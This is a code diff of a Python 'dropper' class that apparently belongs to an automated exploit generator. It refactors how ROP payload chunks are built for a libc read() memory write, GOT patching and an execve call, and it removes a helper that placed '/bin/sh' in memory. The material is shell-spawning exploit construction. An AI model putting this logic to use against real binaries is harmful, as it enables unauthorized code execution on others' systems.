@@ -104,10 +104,8 @@ class dropper():
             pl_mem = self.gts.build_memory_write(self.writeable_area, mem_args)
         else:
             self.fd_payload = mem_args
-            pl_mem = self.gts.get_mem_set_libc_read_chunk(self.writeable_area,
-                                                           self.can_control_fd,
-                                                           len(mem_args),
-                                                           self.imports_plt['read'])
+            pl_mem = self.gts.get_ret_func_chunk([self.can_control_fd, self.writeable_area, len(mem_args)],
+                                                 self.imports_plt['read'])
 
         if 'execve' not in self.imports:
             got_patching_chunk = self.gts.build_mem_add(self.imports[self._got_f].entry.r_offset,
@@ -115,10 +113,10 @@ class dropper():
                                                         self._got_size,
                                                         self._got_base)
 
-            pl_execve = self.gts.get_execve_chunk(args, self.imports_plt[self._got_f])
+            pl_execve = self.gts.get_ret_func_chunk(args, self.imports_plt[self._got_f])
             return PayloadChunk.chain([pl_mem, got_patching_chunk, pl_execve])
         else:
-            pl_execve = self.gts.get_execve_chunk(args, self.imports_plt['execve'])
+            pl_execve = self.gts.get_ret_func_chunk(args, self.imports_plt['execve'])
             return PayloadChunk.chain([pl_mem, pl_execve])
 
 
@@ -161,17 +159,6 @@ class dropper():
             read_input += arg
 
         return [first_arg, second_arg, third_arg], read_input
-
-    def _write_command_to_memory(self):
-        self.cmd = "/bin/sh"
-        if self.can_control_fd != -1 and 'read' in self.imports:
-            plc = self.gts.get_mem_set_libc_read_chunk(self.writeable_area,
-                                                  self.can_control_fd,
-                                                  len(self.cmd),
-                                                  self.imports_plt['read'])
-
-
-            return plc
 
     def save_state_to_file(self, f):
         s = self.save_state()
